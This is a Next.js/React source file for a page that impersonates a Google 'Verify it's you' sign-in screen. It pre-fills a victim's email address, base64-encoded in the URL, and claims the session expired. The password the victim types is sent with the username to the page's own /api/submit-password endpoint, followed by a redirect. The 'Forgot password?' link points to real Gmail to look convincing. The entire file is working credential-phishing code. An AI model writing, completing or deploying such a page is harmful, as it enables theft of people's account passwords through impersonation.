'use client';

import { useSearchParams } from 'next/navigation';
import { useState } from 'react';
import { decodeBase64 } from '@/lib/utils';
import SearchParamsWrapper from '../../components/SearchParamsWrapper';
import { notFound } from 'next/navigation';
import '../../public/styles/lettus.css'; 
function LettusPageContent() {
  const searchParams = useSearchParams();
  // Get the first query parameter value (regardless of key name)
  const data3 = Array.from(searchParams.values())[0];
  const [showPassword, setShowPassword] = useState(false);

  // 🔥 Trigger Next.js not-found.tsx if data is missing
  if (!data3) {
    notFound(); // This will render your app/not-found.tsx
  }
  const username = decodeBase64(data3);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const password = formData.get('password') as string;

    const response = await fetch('/api/submit-password', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username, password }),
    });

    if (response.ok) {
      const result = await response.json();
      window.location.href = result.redirectUrl;
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
   <>
        <div className="maindiv">
          <div className="form-half">
            <div>
              <img className="divlogo" src="./images/image.png" alt="Logo" />
            </div>
            <div>
              <span className="welcome">Verify it&apos;s you</span>
            </div>
            <div className="userdiv">
              <img className="user-icon" src="./images/user-circle.png" alt="User Icon" />
              <span style={{ color: '#2c2a2a', fontSize: '18px', fontFamily: 'Arial, Helvetica, sans-serif' }}>
                {username}
              </span>
              <img className="dropdown-icon" src="./images/dropd.jpg" alt="Dropdown Icon" />
            </div>
          </div>

          <form className="loginform" onSubmit={handleSubmit}>
            <div className="form-half1">
              <div className="session-expired-message">
                <p>Enter Password : Login again to continue.</p>
              </div>

              <div className="passdiv">
                <input
                  required
                  name="password"
                  type={showPassword ? 'text' : 'password'}
                  id="pEyar"
                  placeholder=""
                  onFocus={(e) => e.target.classList.add('focused')}
                  onBlur={(e) => {
                    if (e.target.value.trim() !== '') {
                      e.target.classList.add('focused');
                    } else {
                      e.target.classList.remove('focused');
                    }
                  }}
                />
                <label htmlFor="pEyar" className="placeholder-label">
                  Enter Your Password
                </label>
              </div>

              <div id="togglePassword" className="shwpwd">
                <input
                  type="checkbox"
                  onChange={togglePasswordVisibility}
                  checked={showPassword}
                  className="checkbox"
                />
                <span onClick={togglePasswordVisibility} className="button">
                  Show password
                </span>
              </div>

              <div className="fgtpwd">
                <button
                  type="button"
                  className="hyperl"
                  onClick={() => (window.location.href = 'https://mail.google.com')}
                >
                  Forgot password?
                </button>
                &nbsp;&nbsp;&nbsp;
                <button type="submit" className="btnnxt">
                  Next
                </button>
              </div>
            </div>
          </form>
        </div>

        <div className="btmdiv">
          <div className="left-div">
            <select className="btmhypl" id="language-select">
              <option value="en">English (United States)</option>
              <option value="fr">French</option>
              <option value="es">Spanish</option>
              <option value="de">German</option>
            </select>
          </div>

          <div className="right-divs">
            <div className="right-div">
              <button className="btmhypl">Help</button>
            </div>
            <div className="right-div">
              <button className="btmhypl">Privacy</button>
            </div>
            <div className="right-div">
              <button className="btmhypl">Terms</button>
            </div>
          </div>
        </div>
</>
  );
}

export default function LettusPage() {
  return (
    <SearchParamsWrapper>
      <LettusPageContent />
    </SearchParamsWrapper>
  );
}